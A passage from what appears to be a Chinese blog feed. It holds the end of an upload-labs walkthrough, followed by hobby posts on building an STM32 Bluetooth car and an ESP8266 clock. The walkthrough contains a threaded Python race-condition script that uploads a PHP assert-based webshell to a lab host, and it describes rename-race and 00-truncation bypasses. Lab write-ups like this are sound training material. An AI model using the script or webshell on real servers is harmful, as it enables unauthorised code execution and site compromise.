invoke__">unlink</span>(<span class="variable">$upload_file</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="variable">$msg</span> = <span class="string">&#x27;上传出错！&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>条件竞争：先将文件上传到服务器，然后判断文件后缀是否在白名单里，如果在则重命名，反之删除，因此我们可以上传3.php只需要在它删除之前访问即可。</p><p>思路一：这里可以利用burp的intruder模块不断上传，然后我们不断的访问刷新该地址即可。</p><p>思路二：首先pip install hackhttp安装hackhttp模块，然后运行下面的Python脚本即可。在运行的同时连接webshell。<br>Python脚本如下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> hackhttp <span class="keyword">from</span> multiprocessing.dummy </span><br><span class="line"><span class="keyword">import</span> Pool <span class="keyword">as</span> ThreadPooldef upload(lists):    </span><br><span class="line">    hh = hackhttp.hackhttp()    </span><br><span class="line">    raw = <span class="string">&quot;&quot;&quot;POST /Pass-17/index.php HTTP/1.1Host: 192.168.160.141User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:49.0) Gecko/20100101 Firefox/49.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3Accept-Encoding: gzip, deflateReferer: http://192.168.160.141/Pass-17/index.phpCookie: pass=17Connection: closeUpgrade-Insecure-Requests: 1Content-Type: multipart/form-data; boundary=---------------------------6696274297634Content-Length: 341-----------------------------6696274297634Content-Disposition: form-data; name=&quot;upload_file&quot;; filename=&quot;3.php&quot;Content-Type: application/octet-stream&lt;?php assert($_POST[&quot;LandGrey&quot;])?&gt;-----------------------------6696274297634Content-Disposition: form-data; name=&quot;submit&quot;上传-----------------------------6696274297634--&quot;&quot;&quot;</span>    code, head, html, redirect, log = hh.http(<span class="string">&#x27;http://192.168.160.141/Pass-17/index.php&#x27;</span>, raw=raw)    <span class="built_in">print</span>(<span class="built_in">str</span>(code) + <span class="string">&quot;\r&quot;</span>)pool = ThreadPool(<span class="number">10</span>)pool.<span class="built_in">map</span>(upload, <span class="built_in">range</span>(<span class="number">10000</span>))pool.close()pool.join()</span><br></pre></td></tr></table></figure><h2 id="Pass-18-上传重命名绕过"><a href="#Pass-18-上传重命名绕过" class="headerlink" title="Pass-18 上传重命名绕过"></a>Pass-18 上传重命名绕过</h2><p>查看源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//index.php</span></span><br><span class="line"><span class="variable">$is_upload</span> = <span class="literal">false</span>;</span><br><span class="line"><span class="variable">$msg</span> = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>]))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">require_once</span>(<span class="string">&quot;./myupload.php&quot;</span>);</span><br><span class="line">    <span class="variable">$imgFileName</span> =<span class="title function_ invoke__">time</span>();</span><br><span class="line">    <span class="variable">$u</span> = <span class="keyword">new</span> <span class="title class_">MyUpload</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>], <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>], <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;size&#x27;</span>],<span class="variable">$imgFileName</span>);</span><br><span class="line">    <span class="variable">$status_code</span> = <span class="variable">$u</span>-&gt;<span class="title function_ invoke__">upload</span>(UPLOAD_PATH);</span><br><span class="line">    <span class="keyword">switch</span> (<span class="variable">$status_code</span>) &#123;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">            <span class="variable">$is_upload</span> = <span class="literal">true</span>;</span><br><span class="line">            <span class="variable">$img_path</span> = <span class="variable">$u</span>-&gt;cls_upload_dir . <span class="variable">$u</span>-&gt;cls_file_rename_to;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&#x27;文件已经被上传，但没有重命名。&#x27;</span>;</span><br><span class="line">            <span class="keyword">break</span>; </span><br><span class="line">        <span class="keyword">case</span> -<span class="number">1</span>:</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&#x27;这个文件不能上传到服务器的临时文件存储目录。&#x27;</span>;</span><br><span class="line">            <span class="keyword">break</span>; </span><br><span class="line">        <span class="keyword">case</span> -<span class="number">2</span>:</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&#x27;上传失败，上传目录不可写。&#x27;</span>;</span><br><span class="line">            <span class="keyword">break</span>; </span><br><span class="line">        <span class="keyword">case</span> -<span class="number">3</span>:</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&#x27;上传失败，无法上传该类型文件。&#x27;</span>;</span><br><span class="line">            <span class="keyword">break</span>; </span><br><span class="line">        <span class="keyword">case</span> -<span class="number">4</span>:</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&#x27;上传失败，上传的文件过大。&#x27;</span>;</span><br><span class="line">            <span class="keyword">break</span>; </span><br><span class="line">        <span class="keyword">case</span> -<span class="number">5</span>:</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&#x27;上传失败，服务器已经存在相同名称文件。&#x27;</span>;</span><br><span class="line">            <span class="keyword">break</span>; </span><br><span class="line">        <span class="keyword">case</span> -<span class="number">6</span>:</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&#x27;文件无法上传，文件不能复制到目标目录。&#x27;</span>;</span><br><span class="line">            <span class="keyword">break</span>;      </span><br><span class="line">        <span class="keyword">default</span>:</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&#x27;未知错误！&#x27;</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//myupload.php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MyUpload</span></span>&#123;</span><br><span class="line">......</span><br><span class="line">......</span><br><span class="line">...... </span><br><span class="line">  <span class="keyword">var</span> <span class="variable">$cls_arr_ext_accepted</span> = <span class="keyword">array</span>(</span><br><span class="line">      <span class="string">&quot;.doc&quot;</span>, <span class="string">&quot;.xls&quot;</span>, <span class="string">&quot;.txt&quot;</span>, <span class="string">&quot;.pdf&quot;</span>, <span class="string">&quot;.gif&quot;</span>, <span class="string">&quot;.jpg&quot;</span>, <span class="string">&quot;.zip&quot;</span>, <span class="string">&quot;.rar&quot;</span>, <span class="string">&quot;.7z&quot;</span>,<span class="string">&quot;.ppt&quot;</span>,</span><br><span class="line">      <span class="string">&quot;.html&quot;</span>, <span class="string">&quot;.xml&quot;</span>, <span class="string">&quot;.tiff&quot;</span>, <span class="string">&quot;.jpeg&quot;</span>, <span class="string">&quot;.png&quot;</span> );</span><br><span class="line"></span><br><span class="line">......</span><br><span class="line">......</span><br><span class="line">......  </span><br><span class="line">  <span class="comment">/** upload()</span></span><br><span class="line"><span class="comment">   **</span></span><br><span class="line"><span class="comment">   ** Method to upload the file.</span></span><br><span class="line"><span class="comment">   ** This is the only method to call outside the class.</span></span><br><span class="line"><span class="comment">   ** <span class="doctag">@para</span> String name of directory we upload to</span></span><br><span class="line"><span class="comment">   ** <span class="doctag">@returns</span> void</span></span><br><span class="line"><span class="comment">  **/</span></span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">upload</span>(<span class="params"> <span class="variable">$dir</span> </span>)</span>&#123;</span><br><span class="line">    </span><br><span class="line">    <span class="variable">$ret</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">isUploadedFile</span>();</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span>( <span class="variable">$ret</span> != <span class="number">1</span> )&#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">resultUpload</span>( <span class="variable">$ret</span> );</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$ret</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">setDir</span>( <span class="variable">$dir</span> );</span><br><span class="line">    <span class="keyword">if</span>( <span class="variable">$ret</span> != <span class="number">1</span> )&#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">resultUpload</span>( <span class="variable">$ret</span> );</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$ret</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">checkExtension</span>();</span><br><span class="line">    <span class="keyword">if</span>( <span class="variable">$ret</span> != <span class="number">1</span> )&#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">resultUpload</span>( <span class="variable">$ret</span> );</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$ret</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">checkSize</span>();</span><br><span class="line">    <span class="keyword">if</span>( <span class="variable">$ret</span> != <span class="number">1</span> )&#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">resultUpload</span>( <span class="variable">$ret</span> );    </span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// if flag to check if the file exists is set to 1</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span>( <span class="variable language_">$this</span>-&gt;cls_file_exists == <span class="number">1</span> )&#123;</span><br><span class="line">      </span><br><span class="line">      <span class="variable">$ret</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">checkFileExists</span>();</span><br><span class="line">      <span class="keyword">if</span>( <span class="variable">$ret</span> != <span class="number">1</span> )&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">resultUpload</span>( <span class="variable">$ret</span> );    </span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// if we are here, we are ready to move the file to destination</span></span><br><span class="line"></span><br><span class="line">    <span class="variable">$ret</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">move</span>();</span><br><span class="line">    <span class="keyword">if</span>( <span class="variable">$ret</span> != <span class="number">1</span> )&#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">resultUpload</span>( <span class="variable">$ret</span> );    </span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// check if we need to rename the file</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>( <span class="variable language_">$this</span>-&gt;cls_rename_file == <span class="number">1</span> )&#123;</span><br><span class="line">      <span class="variable">$ret</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">renameFile</span>();</span><br><span class="line">      <span class="keyword">if</span>( <span class="variable">$ret</span> != <span class="number">1</span> )&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">resultUpload</span>( <span class="variable">$ret</span> );    </span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// if we are here, everything worked as planned :)</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">resultUpload</span>( <span class="string">&quot;SUCCESS&quot;</span> );</span><br><span class="line">  </span><br><span class="line">  &#125;</span><br><span class="line">......</span><br><span class="line">......</span><br><span class="line">...... </span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>利用上传重命名竞争+Apache解析漏洞，成功绕过<br>上传名字为3.php.7Z的文件，快速重复提交该数据包，会让服务器来不及重命名，从而上传成功，并不被重命名。</p><h2 id="Pass-19-00截断"><a href="#Pass-19-00截断" class="headerlink" title="Pass-19 00截断"></a>Pass-19 00截断</h2><p>查看源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$is_upload</span> = <span class="literal">false</span>;</span><br><span class="line"><span class="variable">$msg</span> = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">file_exists</span>(UPLOAD_PATH)) &#123;</span><br><span class="line">        <span class="variable">$deny_ext</span> = <span class="keyword">array</span>(<span class="string">&quot;php&quot;</span>,<span class="string">&quot;php5&quot;</span>,<span class="string">&quot;php4&quot;</span>,<span class="string">&quot;php3&quot;</span>,<span class="string">&quot;php2&quot;</span>,<span class="string">&quot;html&quot;</span>,<span class="string">&quot;htm&quot;</span>,<span class="string">&quot;phtml&quot;</span>,<span class="string">&quot;pht&quot;</span>,<span class="string">&quot;jsp&quot;</span>,<span class="string">&quot;jspa&quot;</span>,<span class="string">&quot;jspx&quot;</span>,<span class="string">&quot;jsw&quot;</span>,<span class="string">&quot;jsv&quot;</span>,<span class="string">&quot;jspf&quot;</span>,<span class="string">&quot;jtml&quot;</span>,<span class="string">&quot;asp&quot;</span>,<span class="string">&quot;aspx&quot;</span>,<span class="string">&quot;asa&quot;</span>,<span class="string">&quot;asax&quot;</span>,<span class="string">&quot;ascx&quot;</span>,<span class="string">&quot;ashx&quot;</span>,<span class="string">&quot;asmx&quot;</span>,<span class="string">&quot;cer&quot;</span>,<span class="string">&quot;swf&quot;</span>,<span class="string">&quot;htaccess&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="variable">$file_name</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;save_name&#x27;</span>];</span><br><span class="line">        <span class="variable">$file_ext</span> = <span class="title function_ invoke__">pathinfo</span>(<span class="variable">$file_name</span>,PATHINFO_EXTENSION);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(!<span class="title function_ invoke__">in_array</span>(<span class="variable">$file_ext</span>,<span class="variable">$deny_ext</span>)) &#123;</span><br><span class="line">            <span class="variable">$temp_file</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">            <span class="variable">$img_path</span> = UPLOAD_PATH . <span class="string">&#x27;/&#x27;</span> .<span class="variable">$file_name</span>;</span><br><span class="line">            <span class="keyword">if</span> (<span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$temp_file</span>, <span class="variable">$img_path</span>)) &#123; </span><br><span class="line">                <span class="variable">$is_upload</span> = <span class="literal">true</span>;</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="variable">$msg</span> = <span class="string">&#x27;上传出错！&#x27;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&#x27;禁止保存为该类型文件！&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="variable">$msg</span> = UPLOAD_PATH . <span class="string">&#x27;文件夹不存在,请手工创建！&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>观察发现move_uploaded_file()函数中的img_path是由post参数save_name控制的，因此可以在save_name利用00截断绕过<br>后面的同Pass-12中一样。</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;本篇文章仅仅记录通关技巧以及文件上传姿势，具体过程以及相关基础概念就不详细叙述&lt;/p&gt;
&lt;p&gt;环境：&lt;a href=&quot;https://github.com/c0ny1/upload-labs&quot;&gt;upload-labs&lt;/a&gt;（建议用集成环境压缩包或者是docker搭建，手工搭建部分pass可能无法通关）&lt;/p&gt;
&lt;p&gt;工具：burpsuite 2022.3.2&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://blog-1302407307.cos.ap-nanjing.myqcloud.com/image/image-20220509222929329.png&quot; alt=&quot;image-20220509222929329&quot;&gt;&lt;/p&gt;</summary>
    
    
    
    
    <category term="渗透测试" scheme="http://www.beigui.xyz/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
  </entry>
  
  <entry>
    <title>基于STM32的蓝牙小车</title>
    <link href="http://www.beigui.xyz/2022/01/23/Stm32-car/"/>
    <id>http://www.beigui.xyz/2022/01/23/Stm32-car/</id>
    <published>2022-01-23T10:35:58.000Z</published>
    <updated>2022-09-17T09:16:49.499Z</updated>
    
    <content type="html"><![CDATA[<p><img src="https://blog-1302407307.cos.ap-nanjing.myqcloud.com/image/2022012302.png" alt="2022012302"></p><p>​        寒假在家除了在高数和英语的海洋里畅(yan)游(mo).之外也没什么其他事情，看到早已经退休甚至失去一个轮胎的遥控小车，我的双手再也忍不住了，就成功的把他大卸八块，然后检查一番除了马达和三个轮胎其他的都报废了，正好我在酷安收藏过制作小车的文章，于是就有了今天的这篇文章🎫 <strong>所需文件链接我依旧会放在文章最后</strong></p><span id="more"></span><p>本文是基于酷安大佬[<strong>不妨大胆一点]</strong>(<a href="http://www.coolapk.com/u/639101">http://www.coolapk.com/u/639101</a>) 的文章而来。</p><blockquote><h2 id="小车原材料"><a href="#小车原材料" class="headerlink" title="小车原材料"></a>小车原材料</h2></blockquote><ol><li>小车框架(报废小车)</li><li>STM32F103C8T6核心板(买国产就行完全够用)</li><li>蓝牙模块HC-05</li><li>L8110S电机驱动模块</li><li>USB转TTL (CH340G模块)</li><li>洞洞板(可用可不用)</li><li>杜邦线</li><li>电烙铁，锡焊(因为我是第一次接触电焊所以直接拼多多找便宜)</li></ol><blockquote><h2 id="原理图，小车接线图"><a href="#原理图，小车接线图" class="headerlink" title="原理图，小车接线图"></a>原理图，小车接线图</h2></blockquote><p>这里直接放酷安大佬的图，注意STM32与L9110S的正负极为一一对应关系，图中有误</p><p><strong>图中绿线的正负极接反了</strong></p><p><img src="https://blog-1302407307.cos.ap-nanjing.myqcloud.com/image/2022012302.png" alt="2022012302"></p><p>手机APP发送信号到蓝牙模块HC05，HC05通过RXD、TXD引脚与STM32的A9(TXD)、A10(RXD)通信，STM32通过B5、B6，B8、B9输出高&#x2F;低电平(0&#x2F;1)给电机驱动模块L9110S，L9110S驱动马达A、B的正反转。</p><p>MOTOR A控制马达A，MOTOR B控制马达B。马达A、马达B各自的两根引线直接接对应的MOTOR即可，最后烧录完程序后若发现正反转不对，将两根引线的位置换一下即可。</p><blockquote><h2 id="代码烧录"><a href="#代码烧录" class="headerlink" title="代码烧录"></a>代码烧录</h2></blockquote><p>此处代码烧录注意要从官网下载keiluv5，我一开始随便找的keiluv5总是显示各种语法错误，后经指点重新在官网下载keiluv5;</p><p>下载代码烧录软件<a href="http://www.jisuxz.com/down/66256.html">XCOM串口调试助手</a>；</p><p>源码在<a href="https://github.com/sunergao/Bluetooth-intelligent-car">这里</a>，打不开的话用<a href="https://wwe.lanzout.com/i4Ozjxvbr6d">备用链接</a>。</p><p>找到源码文件夹里的这个，</p><p><img src="https://blog-1302407307.cos.ap-nanjing.myqcloud.com/image/908a7e1d6068438393c4170b84be7971.png" alt="img">用keil打开，如图，主要在motor.c和main.c里面修改</p><p><img src="https://blog-1302407307.cos.ap-nanjing.myqcloud.com/image/5bca8fc5010b4d4b8f39a030c447c585.png" alt="img">如果按照前面的硬件设计，则不需要做任何修改， 点击图示图标生成hex文件，</p><p><img src="https://blog-1302407307.cos.ap-nanjing.myqcloud.com/image/0ee52d5e9e8d4e4bb49c3872500925e6.png" alt="img">小车与电脑连接，连接需要做以下工作</p><p>（1）安装CH340G的驱动</p><p>（2）STM32的A9、A10(原本与蓝牙模块连接，先拔掉，烧完程序再连上)分别连接CH340G模块的RXD、TXD，5V、GND对应连接就好了</p><p>（3）CH340G模块插到电脑上，STM32的BOOT0置1（默认是在0上的），按下RESET键</p><p>打开烧录软件，选择「搜索串口(X)」，相应的串口会在「Port」上显示，选CH340，如果找不到串口可能是因为驱动没安装成功。<br><img src="https://blog-1302407307.cos.ap-nanjing.myqcloud.com/image/fce3227867cc4ed798a2c05a4074e56f.png" alt="img"></p><p>（4） 然后选择「联机下载时的程序文件」，找到hex文件，如图</p><p><img src="https://blog-1302407307.cos.ap-nanjing.myqcloud.com/image/971223696c2b413583da92f06c118ca9.png" alt="img"></p><p> （5）其它都默认就行，选择「开始编程(P)」，如果提示连接不到硬件，就看上面的步骤哪做错了，如果成功了，断电，把BOOT0还原为0，A9、A10接回蓝牙模块。</p><blockquote><h2 id="手机蓝牙控制器"><a href="#手机蓝牙控制器" class="headerlink" title="手机蓝牙控制器"></a>手机蓝牙控制器</h2></blockquote><p>安卓手机(苹果不清楚）应用商店下载「蓝牙串口」，图标是个SPP；用充电宝给STM32供电，看各个模块的指示灯是否正常，亮了说明就通电了，有电说明咱就成功一大步了！</p><p>打开「蓝牙串口」软件，连接蓝牙，切换到「键盘」的位置，如下图</p><p><img src="https://blog-1302407307.cos.ap-nanjing.myqcloud.com/image/2022012303.png" alt="2022012303">这是我的设置，以「前进」为例讲解，打开「编辑模式」，设置如下图</p><p><img src="https://blog-1302407307.cos.ap-nanjing.myqcloud.com/image/image-20220123203423224.png" alt="image-20220123203423224"></p><p>按下时发送4，松开时发送0，在main.c的while()中可以看到对应的模式</p><p><img src="https://blog-1302407307.cos.ap-nanjing.myqcloud.com/image/09a2e932a5c445939f7986fb02a8edbe.png" alt="img">其它的按键参照上图来设置就行了，设置完关掉「编辑模式」，按下不同的按键测试吧，运气好的话，你的STM32蓝牙小车就大功告成了，🎉🎉🎉。</p><hr><p>上面的教程和 大佬的原文相差不大，甚至图片我都是盗图(〃￣︶￣)人(￣︶￣〃)</p><blockquote><h2 id="心得"><a href="#心得" class="headerlink" title="心得"></a>心得</h2></blockquote><p>做完真的是感叹隔行如隔山呀，还是老老实实的做我的安全吧🤣</p><p>在杰哥的帮助下学会了一项新技能，成功为电路板和马达上锡，以后搞点东西就越来越顺手了😁</p><p>还有就是这个蓝牙模块把我实在坑了一下，起初大佬教程写着HC-05 是可以3.3v供电的结果，结果呀，它必须3.7v才行，而且蓝牙模块一开始无法双向通信，我以为是模块坏了，刚跟商家对完线，后头一查资料发现是模块模式卖家给设置成回环模式了，我又查的资料设置回来成被动模式，真是一波三折呀，不过总归成功了，最后我这颜值为负值的人生第一辆属于自己的车，镇一下文章</p><p><img src="https://blog-1302407307.cos.ap-nanjing.myqcloud.com/image/2022012305.png" alt="2022012305"></p>]]></content>
    
    
    <summary type="html">&lt;p&gt;&lt;img src=&quot;https://blog-1302407307.cos.ap-nanjing.myqcloud.com/image/2022012302.png&quot; alt=&quot;2022012302&quot;&gt;&lt;/p&gt;
&lt;p&gt;​        寒假在家除了在高数和英语的海洋里畅(yan)游(mo).之外也没什么其他事情，看到早已经退休甚至失去一个轮胎的遥控小车，我的双手再也忍不住了，就成功的把他大卸八块，然后检查一番除了马达和三个轮胎其他的都报废了，正好我在酷安收藏过制作小车的文章，于是就有了今天的这篇文章🎫 &lt;strong&gt;所需文件链接我依旧会放在文章最后&lt;/strong&gt;&lt;/p&gt;</summary>
    
    
    
    
    <category term="日常发烧" scheme="http://www.beigui.xyz/tags/%E6%97%A5%E5%B8%B8%E5%8F%91%E7%83%A7/"/>
    
  </entry>
  
  <entry>
    <title>esp8266制作外星人时钟</title>
    <link href="http://www.beigui.xyz/2021/11/15/esp8266/"/>
    <id>http://www.beigui.xyz/2021/11/15/esp8266/</id>
    <published>2021-11-15T03:11:36.000Z</published>
    <updated>2022-09-17T09:16:49.496Z</updated>
    
    <content type="html"><![CDATA[<p><img src="https://blog-1302407307.cos.ap-nanjing.myqcloud.com/image/20211113150514.jpg" alt="20211113150514"></p><p>这几天刷酷安看到有大佬通过esp8266模块加1.3寸TFT屏幕做成的外星人时钟，瞬间感觉心动不已，于是立马淘宝下单采购原材料。(一块ESP8266开发板+USB数据线+母对母的杜邦线,一块1.3寸TFT屏幕，像我一样的小白建议买带针脚的。)  ； <strong>所需文件链接我会放在文章最后</strong></p><span id="more"></span><blockquote><h2 id="外星人时钟制作"><a href="#外星人时钟制作" class="headerlink" title="外星人时钟制作"></a>外星人时钟制作</h2></blockquote><p>材料准备完毕后，通过杜邦线将屏幕与开发板之间进行连接</p><p>左边为屏幕引脚，右边为开发板引脚，3v和g千万不能接反。</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">屏幕 ESP8266-12F </span><br><span class="line">GND&lt;-----&gt;G</span><br><span class="line">VCC&lt;-----&gt;3V</span><br><span class="line">SCL&lt;-----&gt;D5</span><br><span class="line">SDA&lt;-----&gt;D7</span><br><span class="line">RES&lt;-----&gt;D0</span><br><span class="line">DC &lt;-----&gt;D6</span><br><span class="line">BLK&lt;-----&gt;3V</span><br></pre></td></tr></table></figure><p>​连接完成后通过USB线将开发板与电脑连接，安装Arduino软件并将8266与CH340的串口驱动打上，将“库“文件夹中的文件全部复制到Arduino安装目录下的libraries目录中。</p><p><img src="https://blog-1302407307.cos.ap-nanjing.myqcloud.com/image/image-20211115114455371.png" alt="image-20211115114455371"></p><p>​在文件夹clockV101中用Arduino打开clockV101的Arduino源程序，在设备管理器中查看esp8266对应端口，并在Arduino中的工具选项卡中设置对应的端口，然后在工具&gt;开发板&gt;选择NodeMCU1.0.</p><p><img src="https://blog-1302407307.cos.ap-nanjing.myqcloud.com/image/image-20211115115249849.png" alt="image-20211115115249849"></p><p>​全部设置完成后，点击烧录按钮，将程序烧录到esp8266中。</p><p><img src="https://blog-1302407307.cos.ap-nanjing.myqcloud.com/image/image-20211115115500877.png" alt="image-20211115115500877"></p><p>​成功点亮，由于是第一次自己做手工DIY出现了很多的问题，经历多次退换货和调整后，他终于成功问世了。</p><p><img 